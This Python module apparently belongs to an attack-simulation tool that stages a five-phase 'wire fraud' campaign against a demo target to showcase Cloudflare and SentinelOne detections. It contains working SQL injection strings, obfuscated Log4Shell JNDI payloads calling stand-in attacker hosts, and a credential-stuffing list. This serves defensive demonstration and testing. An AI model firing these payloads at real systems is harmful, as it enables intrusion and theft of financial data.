"""
campaigns/financial.py — Operation Wire Fraud
5-phase attack chain. NovaMind target: novamind-api + novamind-shop.

MITRE ATT&CK mapping
--------------------
Phase 1 — T1595.002 Active Scanning: Vulnerability Scanning
Phase 2 — T1595.001 Active Scanning: Scanning IP Blocks / T1592 Gather Victim Host Info
Phase 3 — T1110.004 Brute Force: Credential Stuffing
Phase 4 — T1190 Exploit Public-Facing Application (SQLi on financial API)
Phase 5 — T1190 Exploit Public-Facing Application (Log4Shell CVE-2021-44228)

Cloudflare log signal: WAF HTTP events (RayID, ClientIP, Action=block/challenge,
  WAFSQLiAttackScore, SecurityRuleDescription, BotScore)
SentinelOne: PowerQuery on rawLogLine parsed from Logpush HTTP dataset.
"""

import random

from .engine import send_request, log_phase_event, sleep_between_requests

# ---------------------------------------------------------------------------
# Payloads — ported from cf-attack-sim-v2/attacks/payloads/financial.py
# ---------------------------------------------------------------------------

# Recon paths repointed to NovaMind routes where they exist, supplemented
# with legacy financial paths that still yield WAF/recon signal.
RECON_PATHS = [
    # NovaMind real routes (novamind-api)
    "/api/v1/admin",
    "/api/v1/customers",
    "/api/v1/customers/export",
    "/api/v1/orders",
    "/api/v1/auth/login",
    "/api/v1/health",
    # NovaMind real routes (novamind-shop)
    "/search",
    "/login",
    "/checkout",
    "/cart",
    # Financial-sector recon paths — no worker route but yields WAF signal
    "/api/docs", "/swagger", "/swagger.json", "/openapi.json",
    "/actuator", "/actuator/env", "/actuator/health", "/actuator/mappings",
    "/.env", "/.env.backup", "/config", "/config.yml",
    "/api/account", "/api/v1/transactions",
    "/online-banking/login", "/online-banking",
    "/swift/payment", "/swift",
    "/wire-transfer", "/api/wire-transfer",
]

SCANNER_AGENTS = [
    "sqlmap/1.7.8#stable (https://sqlmap.org)",
    "Nikto/2.1.6",
    "Nmap Scripting Engine; banking-recon/2.1",
    "BankingRecon/1.0 (custom scanner)",
    "masscan/1.3.2",
    "zgrab/0.x",
    "python-requests/2.28.0",
    "FinancialAudit/3.1 (security scanner)",
]

ACCOUNT_IDS = list(range(10001, 10051))

CUSTOMER_EMAILS = [
    "admin@novamind.ai",
    "john.smith@novamind.ai",
    "sarah.jones@novamind.ai",
    "m.johnson@novamind.ai",
    "account.holder@novamind.ai",
    "premium.user@novamind.ai",
]

CRED_USERNAMES = [
    "john.smith", "sarah.jones", "m.johnson",
    "account.holder", "premium.user", "banking.admin",
    "wire.transfer.user", "j.doe", "s.miller",
]

CRED_PASSWORDS = [
    "Banking2023!", "Summer2024!", "Welcome1!", "Password123",
    "NovaMind1!", "BankAdmin2024!", "Wire@2023", "Secure#Bank1",
]

SQLI_FINANCIAL = [
    "' OR 1=1--",
    "amount=' OR 1=1--",
    "1 UNION SELECT * FROM transactions--",
    "account_id=1 UNION SELECT ssn,account_number,balance FROM accounts--",
    "' OR EXISTS(SELECT * FROM wire_transfers WHERE amount > 10000)--",
    "1; SELECT * FROM swift_payments--",
    "' UNION SELECT null,routing_number,account_number FROM accounts--",
    "1 AND SLEEP(5)--",
    "' OR '1'='1' AND account_type='PREMIUM'--",
]

LOG4SHELL_PAYLOADS = [
    {
        "ua": "${jndi:ldap://attacker-c2.com/banking-exploit}",
        "header_value": "${jndi:ldap://192.168.1.1:1389/Banking}",
        "x_request_id": "${jndi:ldap://attacker.com/swift-rce}",
    },
    {
        "ua": "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker-c2.com/Exploit}",
        "header_value": "${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attacker.com/banking}",
        "x_request_id": "${jndi:rmi://attacker.com:1099/swift-exploit}",
    },
    {
        "ua": "${jndi:dns://attacker-c2.com/banking-recon}",
        "header_value": "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}",
        "x_request_id": "${jndi:ldap://attacker.com/payment-middleware}",
    },
]


# ---------------------------------------------------------------------------
# Phase functions
# ---------------------------------------------------------------------------

def fire_phase_1_one(target, log_buffer, log_counter, stop_flag):
    """T1595.002 — recon sweep with scanner User-Agents."""
    path = random.choice(RECON_PATHS)
    agent = random.choice(SCANNER_AGENTS)
    send_request(
        url=f"{target}{path}",
        headers={"User-Agent": agent},
        label=f"Recon → {path}",
        log_buffer=log_buffer, log_counter=log_counter, stop_flag=stop_flag,
        phase=1, industry="financial",
    )


def fire_phase_1_many(count, delay_range, target, log_buffer, log_counter, stop_flag):
    log_phase_event(
        "Phase 1: Initial Reconnaissance — mapping NovaMind banking infrastructure",
        1, "financial", log_buffer, log_counter,
    )
    for _ in range(count):
        if stop_flag and stop_flag.is_set():
            break
        fire_phase_1_one(target, log_buffer, log_counter, stop_flag)
        sleep_between_requests(custom_range=delay_range)


def fire_phase_2_one(target, log_buffer, log_counter, stop_flag):
    """T1592 — sequential account / customer enumeration."""
    acct_id = random.choice(ACCOUNT_IDS)
    if random.random() < 0.3:
        email = random.choice(CUSTOMER_EMAILS)
        send_request(
            url=f"{target}/api/v1/customers",
            params={"email": email},
            label=f"Enumeration → customer email probe: {email}",
            log_buffer=log_buffer, log_counter=log_counter, stop_flag=stop_flag,
            phase=2, industry="financial",
        )
    else:
        send_request(
            url=f"{target}/api/v1/customers/{acct_id}",
            label=f"Enumeration → customer id={acct_id}",
            log_buffer=log_buffer, log_counter=log_counter, stop_flag=stop_flag,
            phase=2, industry="financial",
        )


def fire_phase_2_many(count, delay_range, target, log_buffer, log_counter, stop_flag):
    log_phase_event(
        "Phase 2: Account Enumeration — sequential customer ID probing on /api/v1/customers",
        2, "financial", log_buffer, log_counter,
    )
    for i in range(count):
        if stop_flag and stop_flag.is_set():
            break
        acct_id = 10001 + (i % 50)
        send_request(
            url=f"{target}/api/v1/customers/{acct_id}",
            label=f"Enumeration → customer id={acct_id}",
            log_buffer=log_buffer, log_counter=log_counter, stop_flag=stop_flag,
            phase=2, industry="financial",
        )
        sleep_between_requests(custom_range=delay_range)


def fire_phase_3_one(target, log_buffer, log_counter, stop_flag):
    """T1110.004 — credential stuffing across login endpoints."""
    endpoints = ["/api/v1/auth/login", "/login", "/online-banking/login"]
    endpoint = random.choice(endpoints)
    send_request(
        url=f"{target}{endpoint}",
        method="POST",
        data={
            "username": random.choice(CRED_USERNAMES),
            "password": random.choice(CRED_PASSWORDS),
            "action": "login",
        },
        label=f"Credential Stuffing → {endpoint}",
        log_buffer=log_buffer, log_counter=log_counter, stop_flag=stop_flag,
        phase=3, industry="financial",
    )


def fire_phase_3_many(count, delay_range, target, log_buffer, log_counter, stop_flag):
    log_phase_event(
        "Phase 3: Credential Stuffing — botnet targeting NovaMind login endpoints",
        3, "financial", log_buffer, log_counter,
    )
    for _ in range(count):
        if stop_flag and stop_flag.is_set():
            break
        fire_phase_3_one(target, log_buffer, log_counter, stop_flag)
        sleep_between_requests(custom_range=delay_range)


def fire_phase_4_one(target, log_buffer, log_counter, stop_flag):
    """T1190 — SQLi on financial API (customers/orders export)."""
    payload = random.choice(SQLI_FINANCIAL)
    endpoint = random.choice([
        "/api/v1/orders",
        "/api/v1/customers/export",
        "/api/v1/customers",
        "/api/wire-transfer",
    ])
    if endpoint in ("/api/wire-transfer",):
        send_request(
            url=f"{target}{endpoint}",
            method="POST",
            data={"amount": payload, "to_account": "9999", "memo": "transfer"},
            label=f"SQLi Wire Transfer → {payload[:60]}",
            log_buffer=log_buffer, log_counter=log_counter, stop_flag=stop_flag,
            phase=4, industry="financial",
        )
    else:
        send_request(
            url=f"{target}{endpoint}",
            params={"account_id": payload, "q": payload},
            label=f"SQLi → {endpoint} [{payload[:60]}]",
            log_buffer=log_buffer, log_counter=log_counter, stop_flag=stop_flag,
            phase=4, industry="financial",
        )


def fire_phase_4_many(count, delay_range, target, log_buffer, log_counter, stop_flag):
    log_phase_event(
        "Phase 4: Wire Transfer Exploitation — SQL injection on NovaMind financial API endpoints",
        4, "financial", log_buffer, log_counter,
    )
    for _ in range(count):
        if stop_flag and stop_flag.is_set():
            break
        fire_phase_4_one(target, log_buffer, log_counter, stop_flag)
        sleep_between_requests(custom_range=delay_range)


def fire_phase_5_one(target, log_buffer, log_counter, stop_flag):
    """T1190 — Log4Shell CVE-2021-44228 in headers."""
    cve = random.choice(LOG4SHELL_PAYLOADS)
    send_request(
        url=f"{target}/swift/payment",
        headers={
            "User-Agent": cve["ua"],
            "X-Api-Version": cve["header_value"],
            "X-Request-ID": cve["x_request_id"],
        },
        label="Log4Shell CVE-2021-44228 → /swift/payment",
        log_buffer=log_buffer, log_counter=log_counter, stop_flag=stop_flag,
        phase=5, industry="financial",
    )


def fire_phase_5_many(count, delay_range, target, log_buffer, log_counter, stop_flag):
    log_phase_event(
        "Phase 5: Payment Middleware Exploitation — Log4Shell CVE-2021-44228 on SWIFT endpoint",
        5, "financial", log_buffer, log_counter,
    )
    for _ in range(count):
        if stop_flag and stop_flag.is_set():
            break
        fire_phase_5_one(target, log_buffer, log_counter, stop_flag)
        sleep_between_requests(custom_range=delay_range)


# ---------------------------------------------------------------------------
# PHASES manifest — consumed by campaigns/__init__.py and the backend engine
# ---------------------------------------------------------------------------

PHASES = [
    {
        "number": 1,
        "name": "Initial Reconnaissance",
        "description": (
            "Attacker mapping NovaMind banking infrastructure and identifying "
            "exposed endpoints using scanner fingerprints."
        ),
        "mitre_technique": "T1595.002 — Active Scanning: Vulnerability Scanning",
        "target_route": "novamind-api /api/v1/customers, novamind-shop /search /login",
        "what_fires": (
            "Path traversal to financial endpoints, scanner User-Agents (sqlmap, Nmap, Nikto), "
            "admin panel probing. Cloudflare BotScore < 10."
        ),
        "cloudflare_story": (
            "Bot score 2/100 — automated scanner identified. 47 banking endpoint probes "
            "detected. SecurityRuleDescription: scanner fingerprint rules."
        ),
        "sentinelone_story": (
            "Same IP probing 47 banking endpoints in 3 minutes. Recon pattern detected by AI. "
            "PowerQuery: | where ClientRequestPath contains '/api/v1' | stats count by ClientIP"
        ),
        "hyperautomation": (
            "Bot score < 10 AND requests > 20 in 5 min → Auto-challenge IP at Cloudflare edge"
        ),
        "fire_one":  fire_phase_1_one,
        "fire_many": fire_phase_1_many,
    },
    {
        "number": 2,
        "name": "Account Enumeration",
        "description": (
            "Attacker probing customer IDs and emails via /api/v1/customers to build target list."
        ),
        "mitre_technique": "T1595.001 — Active Scanning: Scanning IP Blocks / T1592 Gather Victim Host Info",
        "target_route": "novamind-api /api/v1/customers/:id, /api/v1/customers?email=",
        "what_fires": (
            "Sequential GET /api/v1/customers/10001→10050, customer email probing. "
            "Unusual sequential API access pattern."
        ),
        "cloudflare_story": (
            "Unusual sequential API access — 50 requests to /api/v1/customers in 30 seconds. "
            "Enumeration pattern detected."
        ),
        "sentinelone_story": (
            "AI correlated Phase 1 recon + Phase 2 enumeration as same threat actor. "
            "Timeline: 8 minutes apart. Same ClientIP."
        ),
        "hyperautomation": (
            "Sequential API probing detected → Create medium severity incident, "
            "rate limit source IP"
        ),
        "fire_one":  fire_phase_2_one,
        "fire_many": fire_phase_2_many,
    },
    {
        "number": 3,
        "name": "Credential Stuffing",
        "description": (
            "Botnet of rotating IPs simultaneously attacking NovaMind login "
            "with leaked credentials."
        ),
        "mitre_technique": "T1110.004 — Brute Force: Credential Stuffing",
        "target_route": "novamind-api /api/v1/auth/login, novamind-shop /login",
        "what_fires": (
            "POST /api/v1/auth/login with credential pairs, rotating FAKE_IPS per request. "
            "Distributed botnet pattern across 8+ IPs."
        ),
        "cloudflare_story": (
            "Rate limiting fired — 200 POST requests in 60 seconds across 8 IPs. "
            "Distributed botnet pattern."
        ),
        "sentinelone_story": (
            "Distributed credential attack — 8 source IPs, coordinated timing, "
            "same User-Agent fingerprint. JA4 hash matches known banking trojan."
        ),
        "hyperautomation": (
            "Rate limit fires AND POST to /login → Block ASN, force MFA on all accounts, "
            "page SOC"
        ),
        "fire_one":  fire_phase_3_one,
        "fire_many": fire_phase_3_many,
    },
    {
        "number": 4,
        "name": "Wire Transfer Exploitation",
        "description": (
            "Attacker attempting to manipulate NovaMind financial API endpoints "
            "with SQL injection."
        ),
        "mitre_technique": "T1190 — Exploit Public-Facing Application (SQLi)",
        "target_route": "novamind-api /api/v1/orders, /api/v1/customers/export",
        "what_fires": (
            "POST /api/wire-transfer with SQLi in amount field, "
            "GET /api/v1/customers/export with injection. WAFSQLiAttackScore: 99."
        ),
        "cloudflare_story": (
            "OWASP SQLi rule fired on /api/v1/customers/export. "
            "WAFSQLiAttackScore: 99/100."
        ),
        "sentinelone_story": (
            "Attacker pivoted from enumeration to active exploitation. "
            "Same campaign — 4th phase detected by AI correlation."
        ),
        "hyperautomation": (
            "SQLi on financial endpoint → Critical incident, freeze affected accounts API, "
            "notify compliance team"
        ),
        "fire_one":  fire_phase_4_one,
        "fire_many": fire_phase_4_many,
    },
    {
        "number": 5,
        "name": "Payment Middleware Exploitation",
        "description": (
            "Log4Shell exploit targeting Java-based payment processing middleware "
            "(SWIFT endpoint) via header injection."
        ),
        "mitre_technique": "T1190 — Exploit Public-Facing Application (Log4Shell CVE-2021-44228)",
        "target_route": "/swift/payment (recon signal on novamind-api)",
        "what_fires": (
            "CVE-2021-44228 Log4Shell strings in User-Agent + X-Api-Version headers "
            "targeting /swift/payment."
        ),
        "cloudflare_story": (
            "CVE-2021-44228 signature rule block. FirewallForAIInjectionScore: 100. "
            "WAFRCEAttackScore: 99."
        ),
        "sentinelone_story": (
            "Nation-state level tooling. Log4Shell on payment infrastructure. "
            "Full kill chain Phase 1–5 correlated into single Critical incident."
        ),
        "hyperautomation": (
            "CVE signature + Critical score → Isolate payment API, page CISO, "
            "open P1 Jira ticket, push emergency block rule to Cloudflare edge"
        ),
        "fire_one":  fire_phase_5_one,
        "fire_many": fire_phase_5_many,
    },
]
